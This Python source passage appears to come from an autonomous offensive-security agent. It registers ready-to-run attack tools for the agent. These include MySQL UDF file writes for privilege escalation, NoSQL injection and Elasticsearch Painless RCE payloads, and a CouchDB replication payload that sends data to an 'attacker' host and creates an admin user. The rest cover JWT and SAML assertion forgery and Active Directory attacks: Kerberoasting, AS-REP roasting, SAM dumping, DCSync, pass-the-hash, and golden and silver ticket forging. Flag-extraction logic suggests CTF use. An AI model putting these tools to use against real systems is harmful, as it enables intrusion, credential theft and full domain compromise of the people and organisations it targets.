            return ToolResult(
                tool_name="mssqlclient_query", success=success,
                stdout=stdout_s, stderr=stderr_s,
                exit_code=proc.returncode or 0, elapsed_ms=elapsed,
            )
        except asyncio.TimeoutError:
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(tool_name="mssqlclient_query", success=False,
                stdout="", stderr=f"Timed out after 30s",
                exit_code=-1, elapsed_ms=elapsed)
        except Exception as e:
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(tool_name="mssqlclient_query", success=False,
                stdout="", stderr=str(e), exit_code=-1, elapsed_ms=elapsed)

    gateway.register(
        name="mssqlclient_query", func=_mssqlclient_query,
        description="Execute a SQL query on MSSQL using impacket's mssqlclient.py (pre-installed, works without sqlcmd). Use for data extraction, xp_cmdshell enabling, and linked server enumeration. Preferred over mssql_query on Linux.",
        parameters={
            "host": {"type": "string", "description": "MSSQL host IP or hostname"},
            "port": {"type": "integer", "description": "MSSQL port (default 1433)"},
            "user": {"type": "string", "description": "Database username"},
            "password": {"type": "string", "description": "Database password"},
            "query": {"type": "string", "description": "SQL query to execute"},
        },
    )

    # ── MySQL File Write (UDF / INTO DUMPFILE) ─────────────────────

    gateway.register_shell_tool(
        name="mysql_file_write",
        command_template="echo 'SELECT 0x{hex_content} INTO DUMPFILE \"{file_path}\"' | mysql -h {host} -P {port} -u {user} -p'{password}' 2>&1",
        description="Write a binary file to the MySQL server's filesystem via SELECT ... INTO DUMPFILE. Use for MySQL UDF privilege escalation: write a compiled UDF shared library (.so) to the plugin directory, then CREATE FUNCTION sys_exec to execute commands. Requires FILE privilege and write access to the target path. Use mysql_query first to check @@plugin_dir and @@secure_file_priv.",
        parameters={
            "host": {"type": "string", "description": "MySQL host IP or hostname"},
            "port": {"type": "integer", "description": "MySQL port (default 3306)"},
            "user": {"type": "string", "description": "Database username"},
            "password": {"type": "string", "description": "Database password"},
            "file_path": {"type": "string", "description": "Absolute path on the MySQL server to write the file to (e.g. /usr/lib/mysql/plugin/udf.so)"},
            "hex_content": {"type": "string", "description": "Hex-encoded binary content to write (the compiled .so as hex string)"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    gateway.register_shell_tool(
        name="oracle_query",
        command_template="printf '%s\n' '{query}' | sqlplus -S {user}/{password}@//{host}:{port}/{sid} 2>&1",
        description="Execute a SQL query on an Oracle Database. Use for data extraction, privilege escalation via PL/SQL, and TNS listener interaction.",
        parameters={
            "host": {"type": "string", "description": "Oracle host IP or hostname"},
            "port": {"type": "integer", "description": "Oracle port (default 1521)"},
            "user": {"type": "string", "description": "Database username"},
            "password": {"type": "string", "description": "Database password"},
            "sid": {"type": "string", "description": "Oracle SID or service name"},
            "query": {"type": "string", "description": "SQL query to execute"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    # ── NoSQL Injection Probe ──────────────────────────────────────
    async def nosql_inject(
        target_url: str, param_name: str = "username",
        method: str = "POST", db_type: str = "mongodb",
    ) -> ToolResult:
        """Probe for NoSQL injection vulnerabilities in MongoDB and Elasticsearch.

        Sends $regex/$ne injection payloads for MongoDB and script injection
        payloads for Elasticsearch.  Detects authentication bypass and data
        extraction through injection.
        """
        import asyncio, time, urllib.request, urllib.parse, urllib.error, ssl, json as _json

        start = time.perf_counter()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        results: list[dict] = []
        db_type = db_type.lower().strip()

        if db_type == "mongodb":
            # MongoDB NoSQL injection payloads
            payloads: list[tuple[str, dict]] = [
                ("$ne operator bypass", {"user": {"$ne": ""}, "password": {"$ne": ""}}),
                ("$regex auth bypass", {"user": {"$regex": ".*"}, "password": {"$regex": ".*"}}),
                ("$gt operator bypass", {"user": {"$gt": ""}, "password": {"$gt": ""}}),
                ("$regex user extraction", {"user": {"$regex": "^a.*"}, "password": {"$ne": ""}}),
                ("$where injection", {"$where": "1"}),
            ]
        elif db_type == "elasticsearch":
            payloads = [
                ("script_fields injection",
                 '{"query":{"match_all":{}},"script_fields":{"test":{"script":{"source":"1+1"}}}}'),
                ("painless execute",
                 '{"query":{"match_all":{}},"script_fields":{"test":{"script":{"source":"Runtime.getRuntime().exec(\\\\"cat /flag.txt\\\\").getText()","lang":"painless"}}}}'),
            ]
        else:
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(
                tool_name="nosql_inject", success=False,
                stdout="", stderr=f"Unsupported DB type: {db_type}. Supported: mongodb, elasticsearch",
                exit_code=1, elapsed_ms=elapsed,
            )

        for desc, payload in payloads:
            try:
                body = _json.dumps(payload) if isinstance(payload, dict) else payload
                data = body.encode()
                if method.upper() == "POST":
                    req = urllib.request.Request(target_url, data=data)
                    req.add_header("Content-Type", "application/json")
                else:
                    encoded = urllib.parse.quote(_json.dumps(payload))
                    req = urllib.request.Request(f"{target_url}?{param_name}={encoded}")

                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                body_text = resp.read().decode("utf-8", errors="replace")

                # Detect injection success
                success_indicators = {"success": "true", "token": ":", "flag": "flag{", "admin": "true", "role": "admin"}
                indicators_found = [k for k, v in success_indicators.items() if v.lower() in body_text.lower()]

                import re
                flag_match = re.search(r'flag\{[^}]+\}', body_text)

                results.append({
                    "payload_desc": desc,
                    "response_len": len(body_text),
                    "response_preview": body_text[:300],
                    "indicators": indicators_found,
                    "flag": flag_match.group(0) if flag_match else None,
                    "likely_vulnerable": bool(indicators_found or flag_match),
                })

                if flag_match:
                    break
            except urllib.error.HTTPError as e:
                body = e.read().decode("utf-8", errors="replace") if hasattr(e, 'read') else ""
                results.append({"payload_desc": desc, "http_error": e.code, "body_preview": body[:200]})
            except Exception as e:
                results.append({"payload_desc": desc, "error": str(e)})

        elapsed = (time.perf_counter() - start) * 1000
        found_vuln = any(r.get("likely_vulnerable") for r in results)
        found_flag = [r for r in results if r.get("flag")]
        summary = (
            f"NoSQL injection probe ({db_type}): "
            f"{sum(1 for r in results if r.get('likely_vulnerable'))}/{len(results)} payloads succeeded"
        )
        if found_flag:
            summary += f"\nFLAG: {found_flag[0]['flag']}"

        return ToolResult(
            tool_name="nosql_inject", success=found_vuln,
            stdout=summary + "\n" + _json.dumps(results, indent=2),
            stderr="", exit_code=0 if found_vuln else 1, elapsed_ms=elapsed,
        )

    gateway.register(
        name="nosql_inject",
        func=nosql_inject,
        description="Detect and exploit NoSQL injection in MongoDB ($regex, $ne, $gt, $where) and Elasticsearch (script_fields, Painless RCE). Use on login endpoints or search endpoints that accept JSON input. Automatically extracts flags from responses.",
        parameters={
            "target_url": {"type": "string", "description": "Target login/query endpoint URL (e.g. http://target:port/api/login)"},
            "param_name": {"type": "string", "description": "JSON parameter name to inject (default: username)"},
            "method": {"type": "string", "description": "HTTP method: POST or GET (default: POST)"},
            "db_type": {"type": "string", "description": "NoSQL DB type: mongodb or elasticsearch (default: mongodb)"},
        },
    )

    # ── NoSQL Database Clients ────────────────────────────────────

    gateway.register_shell_tool(
        name="mongodb_query",
        command_template="python3 -c \"\nimport json, sys\ntry:\n    from pymongo import MongoClient\n    client = MongoClient('mongodb://{user}:{password}@{host}:{port}/')\n    db = client['{database}']\n    # Parse and execute the query\n    query_obj = json.loads('''{query_json}''')\n    if isinstance(query_obj, dict):\n        results = list(db.command(query_obj)) if 'find' not in str(query_obj).lower() else list(db.command(json.loads('''{query_json}''')))\n    else:\n        results = list(db.command(query_obj))\n    print(json.dumps(results, default=str, indent=2))\nexcept ImportError:\n    print(json.dumps({'error': 'pymongo not installed, install with: pip install pymongo'}))\nexcept Exception as e:\n    print(json.dumps({'error': str(e)}))\n\" 2>&1",
        description="Execute a MongoDB query or command. Supports NoSQL injection testing ($regex, $ne, $gt operators in query_json). For unauthenticated access, leave user and password empty. database: target DB name (e.g. 'admin', 'test'). query_json: JSON string of query or command (e.g. '{\"find\":\"users\",\"filter\":{\"username\":{\"$regex\":\".*\"}}}'). Use for MongoDB NoSQLi exploitation and unauthorized data access.",
        parameters={
            "host": {"type": "string", "description": "MongoDB host IP or hostname"},
            "port": {"type": "integer", "description": "MongoDB port (default 27017)"},
            "user": {"type": "string", "description": "MongoDB username. Leave empty for unauth access."},
            "password": {"type": "string", "description": "MongoDB password. Leave empty for unauth access."},
            "database": {"type": "string", "description": "MongoDB database name to query (e.g. 'admin', 'test', 'flagdb')"},
            "query_json": {"type": "string", "description": "JSON query string (escaped properly for shell). Use MongoDB extended JSON format. Example: '{\"find\":\"users\",\"filter\":{}}' for listing collections. '{\"find\":\"users\",\"filter\":{\"$where\":\"sleep(5000)\"}}' for blind injection time-based."},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    gateway.register_shell_tool(
        name="elasticsearch_query",
        command_template="curl -s -X {method} 'http://{host}:{port}{path}' -H 'Content-Type: application/json' {body_json} 2>&1",
        description="Query Elasticsearch REST API. Use for data extraction (search queries), index enumeration, and script injection attacks. method: GET for read, POST for search with body. path: API path (e.g. '/_cat/indices?v', '/_search', '/_cluster/health'). body_json: for POST, pass '-d {json}' with search body containing script_fields for script injection (Elasticsearch dynamic scripting). Unauth access common on default installations.",
        parameters={
            "host": {"type": "string", "description": "Elasticsearch host IP or hostname"},
            "port": {"type": "integer", "description": "Elasticsearch port (default 9200)"},
            "method": {"type": "string", "description": "HTTP method: GET, POST, PUT"},
            "path": {"type": "string", "description": "API path (e.g. '/_cat/indices?v', '/_search', '/flag_index/_search')"},
            "body_json": {"type": "string", "description": "For POST/PUT: body as JSON string, prefixed with '-d ' (e.g. '-d \\'{\"query\":{\"match_all\":{}}}\\''). Leave empty for GET requests. For script injection: '-d \\'{\"script_fields\":{\"rce\":{\"script\":\"Runtime.getRuntime().exec(\\\\\"id\\\\\")\"}}}\\''"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    gateway.register_shell_tool(
        name="couchdb_query",
        command_template="curl -s -X {method} 'http://{host}:{port}{path}' -H 'Content-Type: application/json' {body_json} 2>&1",
        description="Interact with CouchDB REST API. Supports database enumeration ('/_all_dbs'), document access ('/db/doc_id'), user management ('/_users/org.couchdb.user:admin'), and replication trigger with privilege escalation ('/_replicate' — create admin user then replicate to gain access). Default port 5984. Many CouchDB instances allow unauthenticated access. Use the /_replicate endpoint with target pointing to a user DB for privilege escalation to create an admin account.",
        parameters={
            "host": {"type": "string", "description": "CouchDB host IP or hostname"},
            "port": {"type": "integer", "description": "CouchDB port (default 5984)"},
            "method": {"type": "string", "description": "HTTP method: GET, POST, PUT"},
            "path": {"type": "string", "description": "API path (e.g. '/_all_dbs', '/_users/org.couchdb.user:admin', '/flagdb/_all_docs?include_docs=true', '/_replicate')"},
            "body_json": {"type": "string", "description": "JSON body for POST/PUT requests. Example for replication attack: '-d \\'{\"source\":\"flagdb\",\"target\":\"http://attacker:5984/leaked\"}\\''. For user creation: '-d \\'{\"name\":\"admin\",\"password\":\"hacked\",\"roles\":[\"_admin\"],\"type\":\"user\"}\\''"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    gateway.register_shell_tool(
        name="jwt_forge",
        command_template="python3 -c \"import jwt,json,time,base64; payload=json.loads(base64.b64decode('{claims_b64}').decode()); print(jwt.encode(payload,'{secret}',algorithm='{algorithm}'))\" 2>&1",
        description="Forge a JSON Web Token (JWT) using a known secret or signing key. Use for authentication bypass when a JWT secret is hardcoded or discovered. Pass claims as base64-encoded JSON string (use base64.b64encode on the JSON claims).",
        parameters={
            "secret": {"type": "string", "description": "JWT signing secret or key"},
            "algorithm": {"type": "string", "description": "JWT algorithm (HS256, HS384, HS512, RS256). Default HS256.", "default": "HS256"},
            "claims_b64": {"type": "string", "description": "Base64-encoded JSON claims payload"},
            "claims": {"type": "string", "description": "Alias for claims_b64 — base64-encoded JSON claims"},
        },
        parser=_parse_shell_output,
        timeout=15,
    )

    # ── SAML Assertion Forge ───────────────────────────────────

    gateway.register_shell_tool(
        name="saml_forge",
        command_template="python3 -c \"import base64,zlib; from xml.etree.ElementTree import Element,SubElement,register_namespace,tostring; from datetime import datetime,timedelta,timezone; NS={'saml':'urn:oasis:names:tc:SAML:2.0:assertion','samlp':'urn:oasis:names:tc:SAML:2.0:protocol','ds':'http://www.w3.org/2000/09/xmldsig#'}; register_namespace('saml',NS['saml']); register_namespace('samlp',NS['samlp']); register_namespace('ds',NS['ds']); now=datetime.now(timezone.utc); ae=Element('{{{saml}}}Assertion'.format(**NS),{{'ID':'_{id}','Version':'2.0','IssueInstant':now.isoformat(),'xmlns:saml':NS['saml']}}); iss=SubElement(ae,'{{{saml}}}Issuer'.format(**NS)); iss.text='{issuer}'; subj=SubElement(ae,'{{{saml}}}Subject'.format(**NS)); nid=SubElement(subj,'{{{saml}}}NameID'.format(**NS),{{'Format':'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress'}}); nid.text='{name_id}'; sc=SubElement(subj,'{{{saml}}}SubjectConfirmation'.format(**NS),{{'Method':'urn:oasis:names:tc:SAML:2.0:cm:bearer'}}); scd=SubElement(sc,'{{{saml}}}SubjectConfirmationData'.format(**NS),{{'NotOnOrAfter':(now+timedelta(hours=1)).isoformat(),'Recipient':'{recipient}'}}); cond=SubElement(ae,'{{{saml}}}Conditions'.format(**NS),{{'NotBefore':now.isoformat(),'NotOnOrAfter':(now+timedelta(hours=1)).isoformat()}}); ar=SubElement(cond,'{{{saml}}}AudienceRestriction'.format(**NS)); aud=SubElement(ar,'{{{saml}}}Audience'.format(**NS)); aud.text='{audience}'; as_el=SubElement(ae,'{{{saml}}}AttributeStatement'.format(**NS)); attr=SubElement(as_el,'{{{saml}}}Attribute'.format(**NS),{{'Name':'{attr_name}'}}); av=SubElement(attr,'{{{saml}}}AttributeValue'.format(**NS)); av.text='{attr_value}'; xml_decl='<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>'; raw=xml_decl+tostring(ae,encoding='unicode'); print(base64.b64encode(raw.encode()).decode())\" 2>&1",
        description="Forge a SAML 2.0 assertion for cloud federation attacks (AWS AssumeRoleWithSAML, GCP workload identity federation, Azure AD SAML). Constructs a minimal SAML assertion XML with the specified attributes and base64-encodes it for use with aws_iam_federation or aws sts assume-role-with-saml. Use when you have stolen a private key but need a properly formatted SAML assertion.",
        parameters={
            "id": {"type": "string", "description": "Unique assertion ID (e.g. '_abc123')", "default": "_saml-assertion-001"},
            "issuer": {"type": "string", "description": "SAML IdP entity ID / issuer (e.g. 'http://idp.example.com/metadata')"},
            "name_id": {"type": "string", "description": "Subject NameID value (e.g. 'user@example.com')"},
            "recipient": {"type": "string", "description": "SAML assertion consumer service URL (e.g. 'https://signin.aws.amazon.com/saml')"},
            "audience": {"type": "string", "description": "SAML audience restriction (e.g. 'https://signin.aws.amazon.com/saml')"},
            "attr_name": {"type": "string", "description": "SAML attribute name for role session (for AWS: 'https://aws.amazon.com/SAML/Attributes/Role')"},
            "attr_value": {"type": "string", "description": "SAML attribute value (for AWS: comma-separated role ARN and provider ARN)"},
        },
        parser=_parse_shell_output,
        timeout=15,
    )

    # ── GraphQL Introspection & Query ───────────────────────────

    async def graphql_introspect(
        target_url: str, query_type: str = "introspection",
        query_body: str = "",
    ) -> ToolResult:
        """Query GraphQL endpoints for schema discovery and data extraction.

        Sends introspection or custom queries to GraphQL endpoints.
        """
        import json as _json, ssl, time, urllib.request

        start = time.perf_counter()

        # Introspection query (full schema dump)
        introspection_query = (
            '{__schema{types{name kind fields{name args{name type{name kind ofType{name}}}}'
            'enumValues{name} inputFields{name type{name}} interfaces{name}} queryType{name}'
            'mutationType{name} subscriptionType{name}}}'
        )

        if query_type == "introspection":
            query = introspection_query
        elif query_body:
            query = query_body
        else:
            query = introspection_query

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        try:
            data = _json.dumps({"query": query}).encode()
            req = urllib.request.Request(
                target_url, data=data,
                headers={"Content-Type": "application/json"},
            )
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            body = resp.read().decode("utf-8", errors="replace")
            result = _json.loads(body) if body.strip().startswith("{") else {"raw": body}
        except Exception as e:
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(
                tool_name="graphql_introspect", success=False,
                stdout="", stderr=str(e), exit_code=-1, elapsed_ms=elapsed,
            )

        # Extract queries and mutations for readable output
        summary: list[dict] = []
        if "data" in result and "__schema" in result.get("data", {}):
            schema = result["data"]["__schema"]
            query_type_name = schema.get("queryType", {}).get("name", "Query")
            mutation_type_name = schema.get("mutationType", {}).get("name", "")

            # Find query and mutation type objects
            for t in schema.get("types", []):
                if t.get("name") == query_type_name:
                    summary.append({
                        "type": "Query", "name": t["name"],
                        "fields": [
                            {"name": f["name"], "args": [a["name"] for a in f.get("args", [])]}
                            for f in t.get("fields", [])
                        ],
                    })
                if mutation_type_name and t.get("name") == mutation_type_name:
                    summary.append({
                        "type": "Mutation", "name": t["name"],
                        "fields": [
                            {"name": f["name"], "args": [a["name"] for a in f.get("args", [])]}
                            for f in t.get("fields", [])
                        ],
                    })

        elapsed = (time.perf_counter() - start) * 1000
        output = _json.dumps({
            "queries_and_mutations": summary,
            "full_schema_summary": f"{len(result.get('data',{}).get('__schema',{}).get('types',[]))} types discovered",
        }, indent=2)
        return ToolResult(
            tool_name="graphql_introspect", success=len(summary) > 0,
            stdout=output, stderr="" if summary else "No schema discovered",
            exit_code=0 if summary else 1, elapsed_ms=elapsed,
        )

    gateway.register(
        name="graphql_introspect",
        func=graphql_introspect,
        description="Query a GraphQL endpoint for schema discovery and data extraction. Introspection mode dumps the full schema — all types, queries, mutations, and their arguments. Use for IDOR discovery: look for queries accepting user IDs or other identifiers that can be manipulated. Custom queries can extract data from discovered types.",
        parameters={
            "target_url": {"type": "string", "description": "GraphQL endpoint URL (e.g. 'http://target:10116/graphql')"},
            "query_type": {"type": "string", "description": "'introspection' for schema discovery, or 'query' to use custom query_body"},
            "query_body": {"type": "string", "description": "Custom GraphQL query when query_type is 'query'. Example: '{getPrescriptions(userId:1){id medication}}'"},
        },
    )

    # ── Active Directory Tools ─────────────────────────────────────

    _NXC = "/home/kianabin/Darwin/venv/bin/netexec"

    gateway.register_shell_tool(
        name="netexec_enum",
        command_template=f"{_NXC} {{protocol}} {{target}} -u '{{user}}' -p '{{password}}' {{extra_flags}} 2>&1",
        description="Enumerate a target using NetExec (nxc). Supports protocols: smb, mssql, winrm, ssh, rdp, ftp. Use for share enumeration, user listing, and credential testing. Common flags: --shares (SMB), --users (LDAP), --local-auth (MSSQL).",
        parameters={
            "protocol": {"type": "string", "description": "Protocol: smb, mssql, winrm, ssh, ldap, rdp, ftp"},
            "target": {"type": "string", "description": "Target IP[:port] or hostname"},
            "user": {"type": "string", "description": "Username for authentication", "default": ""},
            "password": {"type": "string", "description": "Password for authentication", "default": ""},
            "extra_flags": {"type": "string", "description": "Extra nxc flags, e.g. --shares, --users, --local-auth", "default": ""},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="netexec_ldap_enum",
        command_template=f"{_NXC} ldap {{target}} -u '{{user}}' -p '{{password}}' --users 2>&1",
        description="Enumerate AD users via LDAP using NetExec (nxc)",
        parameters={"target": {"type": "string"}, "user": {"type": "string"}, "password": {"type": "string"}},
        parser=_parse_shell_output,
        timeout=60,
    )
    # ── NetExec SMB specialized tools ──────────────────────────────
    gateway.register_shell_tool(
        name="netexec_smb_shares",
        command_template=f"{_NXC} smb {{target}} -u '{{user}}' -p '{{password}}' --shares 2>&1",
        description="Enumerate SMB shares on a target using NetExec. Lists all accessible shares and their read/write permissions. Use to discover writable shares for file upload or to find SYSVOL for GPP/cpassword extraction. Target: IP or hostname.",
        parameters={
            "target": {"type": "string", "description": "Target IP or hostname"},
            "user": {"type": "string", "description": "Domain username"},
            "password": {"type": "string", "description": "Password"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="netexec_smb_users",
        command_template=f"{_NXC} smb {{target}} -u '{{user}}' -p '{{password}}' --users 2>&1",
        description="Enumerate domain users via NetExec SMB. Lists all domain users with their group memberships. Use for discovering privileged accounts and SPN-enabled service accounts.",
        parameters={
            "target": {"type": "string", "description": "Target Domain Controller IP"},
            "user": {"type": "string", "description": "Domain username"},
            "password": {"type": "string", "description": "Password"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="netexec_kerberoasting",
        command_template=f"{_NXC} ldap {{target}} -u '{{user}}' -p '{{password}}' --kerberoasting {{output_file}} 2>&1 | head -100",
        description="Kerberoasting via NetExec LDAP: request TGS tickets for all SPN-enabled accounts. Saves hashes in hashcat format for offline cracking. Use hash_crack tool on the output (hashcat mode 13100). Requires any authenticated domain user.",
        parameters={
            "target": {"type": "string", "description": "Domain Controller IP"},
            "user": {"type": "string", "description": "Domain username"},
            "password": {"type": "string", "description": "Password"},
            "output_file": {"type": "string", "description": "Output file for hashcat-format hashes", "default": "/tmp/kerb_hashes.txt"},
        },
        parser=_parse_shell_output,
        timeout=120,
    )
    gateway.register_shell_tool(
        name="netexec_smb_sam",
        command_template=f"{_NXC} smb {{target}} -u '{{user}}' -p '{{password}}' --sam 2>&1 | head -100",
        description="Dump SAM database from target via NetExec SMB (requires local admin). Extracts local user NTLM hashes. Use when you have admin credentials and need local account hashes for Pass-the-Hash.",
        parameters={
            "target": {"type": "string", "description": "Target IP"},
            "user": {"type": "string", "description": "Administrator username"},
            "password": {"type": "string", "description": "Password"},
        },
        parser=_parse_shell_output,
        timeout=120,
    )
    gateway.register_shell_tool(
        name="impacket_secretsdump",
        command_template="python3 /home/kianabin/Darwin/venv/bin/secretsdump.py {target} 2>&1 | head -100",
        description="Dump SAM/LSA secrets from a target using impacket-secretsdump. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="impacket_psexec",
        command_template="python3 /home/kianabin/Darwin/venv/bin/psexec.py {target} 2>&1",
        description="Execute commands on a remote Windows host via PsExec. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="impacket_wmiexec",
        command_template="python3 /home/kianabin/Darwin/venv/bin/wmiexec.py {target} 2>&1",
        description="Execute commands via WMI on a remote Windows host. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="ldapsearch_ad",
        command_template="ldapsearch -x -H ldap://{target} -D '{user}@{domain}' -w '{password}' -b '{base_dn}' 2>&1 | head -50",
        description="Query Active Directory via LDAP. Use to enumerate users, groups, OUs, and domain trust relationships.",
        parameters={"target": {"type": "string"}, "user": {"type": "string"}, "password": {"type": "string"}, "domain": {"type": "string"}, "base_dn": {"type": "string"}},
        parser=_parse_shell_output,
        timeout=30,
    )
    async def _impacket_GetUserSPNs(domain: str, dc_ip: str,
                                    user: str = "", password: str = "",
                                    **kwargs) -> ToolResult:
        """Kerberoasting: request TGS tickets for users with SPNs. Uses -no-pass when no password."""
        import asyncio, time
        start = time.perf_counter()
        script = "/home/kianabin/Darwin/venv/bin/GetUserSPNs.py"
        if password:
            target = f"{domain}/{user}:{password}@{dc_ip}"
            cmd = f"python3 {script} {target} -request 2>&1 | head -80"
        else:
            cmd = f"python3 {script} {domain}/{user or ''} -dc-ip {dc_ip} -request -no-pass 2>&1 | head -80"
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
            stdout_s = stdout.decode("utf-8", errors="replace")
            stderr_s = stderr.decode("utf-8", errors="replace")
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(tool_name="impacket_GetUserSPNs",
                success=(proc.returncode == 0), stdout=stdout_s, stderr=stderr_s,
                exit_code=proc.returncode or 0, elapsed_ms=elapsed)
        except asyncio.TimeoutError:
            return ToolResult(tool_name="impacket_GetUserSPNs", success=False,
                stdout="", stderr="Timed out after 120s", exit_code=-1,
                elapsed_ms=(time.perf_counter()-start)*1000)
        except Exception as e:
            return ToolResult(tool_name="impacket_GetUserSPNs", success=False,
                stdout="", stderr=str(e), exit_code=-1,
                elapsed_ms=(time.perf_counter()-start)*1000)

    gateway.register(
        name="impacket_GetUserSPNs", func=_impacket_GetUserSPNs,
        description="Kerberoasting: request TGS tickets for users with SPNs. Encrypted tickets can be cracked offline. Set user='' and password='' for unauthenticated Kerberoasting with -no-pass.",
        parameters={
            "domain": {"type": "string", "description": "Active Directory domain name"},
            "dc_ip": {"type": "string", "description": "Domain Controller IP address"},
            "user": {"type": "string", "description": "Username (optional, omit for -no-pass)"},
            "password": {"type": "string", "description": "Password (optional, omit for -no-pass)"},
        },
    )
    async def _impacket_GetNPUsers(domain: str, dc_ip: str,
                                   user: str = "", password: str = "",
                                   **kwargs) -> ToolResult:
        """AS-REP Roasting: request TGT for users without Kerberos pre-authentication. Uses -no-pass when no password."""
        import asyncio, time
        start = time.perf_counter()
        script = "/home/kianabin/Darwin/venv/bin/GetNPUsers.py"
        if password:
            target = f"{domain}/{user}:{password}@{dc_ip}"
            cmd = f"python3 {script} {target} -request -format hashcat 2>&1 | head -80"
        else:
            cmd = f"python3 {script} {domain}/ -dc-ip {dc_ip} -request -format hashcat -no-pass 2>&1 | head -80"
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
            stdout_s = stdout.decode("utf-8", errors="replace")
            stderr_s = stderr.decode("utf-8", errors="replace")
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(tool_name="impacket_GetNPUsers",
                success=(proc.returncode == 0), stdout=stdout_s, stderr=stderr_s,
                exit_code=proc.returncode or 0, elapsed_ms=elapsed)
        except asyncio.TimeoutError:
            return ToolResult(tool_name="impacket_GetNPUsers", success=False,
                stdout="", stderr="Timed out after 120s", exit_code=-1,
                elapsed_ms=(time.perf_counter()-start)*1000)
        except Exception as e:
            return ToolResult(tool_name="impacket_GetNPUsers", success=False,
                stdout="", stderr=str(e), exit_code=-1,
                elapsed_ms=(time.perf_counter()-start)*1000)

    gateway.register(
        name="impacket_GetNPUsers", func=_impacket_GetNPUsers,
        description="AS-REP Roasting: request TGT for users without Kerberos pre-authentication. Hashcat-format output for offline cracking. Set user='' and password='' for unauthenticated AS-REP roasting with -no-pass.",
        parameters={
            "domain": {"type": "string", "description": "Active Directory domain name"},
            "dc_ip": {"type": "string", "description": "Domain Controller IP address"},
            "user": {"type": "string", "description": "Username (optional, omit for -no-pass)"},
            "password": {"type": "string", "description": "Password (optional, omit for -no-pass)"},
        },
    )
    gateway.register_shell_tool(
        name="impacket_secretsdump_dcsync",
        command_template="python3 /home/kianabin/Darwin/venv/bin/secretsdump.py -just-dc {target} 2>&1 | head -100",
        description="DCSync: replicate domain credentials from a Domain Controller. Requires Replication-Get-Changes-All privilege. Target format: DOMAIN/USER:PASSWORD@DC_IP",
        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@DC_IP"}},
        parser=_parse_shell_output,
        timeout=180,
    )
    gateway.register_shell_tool(
        name="impacket_pth",
        command_template="python3 /home/kianabin/Darwin/venv/bin/psexec.py -hashes :{nthash} {target} 2>&1",
        description="Pass-the-Hash: execute commands on a remote Windows host using an NTLM hash instead of a password. Target format: DOMAIN/USER@TARGET_IP. Requires the user's NTLM hash (from secretsdump or DCSync).",
        parameters={
            "nthash": {"type": "string", "description": "NTLM hash (NT part, 32 hex chars)"},
            "target": {"type": "string", "description": "DOMAIN/USER@TARGET_IP"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="impacket_ticketer",
        command_template="python3 /home/kianabin/Darwin/venv/bin/ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} {user} 2>&1 | head -50",
        description="Golden Ticket: forge a Kerberos TGT using the KRBTGT account hash. Grants domain-wide persistence and privilege escalation. Requires KRBTGT NTLM hash and domain SID.",
        parameters={
            "krbtgt_hash": {"type": "string", "description": "KRBTGT account NTLM hash"},
            "domain_sid": {"type": "string", "description": "Domain SID (e.g. S-1-5-21-...)"},
            "domain": {"type": "string", "description": "Fully qualified domain name"},
            "user": {"type": "string", "description": "Username to impersonate (default: Administrator)"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    # ── Silver Ticket ──────────────────────────────────────────────

    gateway.register_shell_tool(
        name="impacket_silver_ticket",
        command_template="python3 /home/kianabin/Darwin/venv/bin/ticketer.py -nthash {service_hash} -domain-sid {domain_sid} -domain {domain} -spn {service_spn} {user} 2>&1 | head -50",
        description="Silver Ticket: forge a Kerberos TGS (service ticket) using the target service account's NTLM hash. Grants access to a specific service (e.g. 'cifs/dc.domain.com', 'http/web.domain.com') without domain admin privileges. Requires the service account's NTLM hash and domain SID.",
        parameters={
            "service_hash": {"type": "string", "description": "Target service account NTLM hash (32 hex chars)"},
            "domain_sid": {"type": "string", "description": "Domain SID (e.g. S-1-5-21-...)"},
            "domain": {"type": "string", "description": "Fully qualified domain name"},
            "service_spn": {"type": "string", "description": "Service SPN (e.g. 'cifs/dc.domain.com', 'http/web.domain.com', 'HOST/dc.domain.com')"},
            "user": {"type": "string", "description": "Username to impersonate (default: Administrator)"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

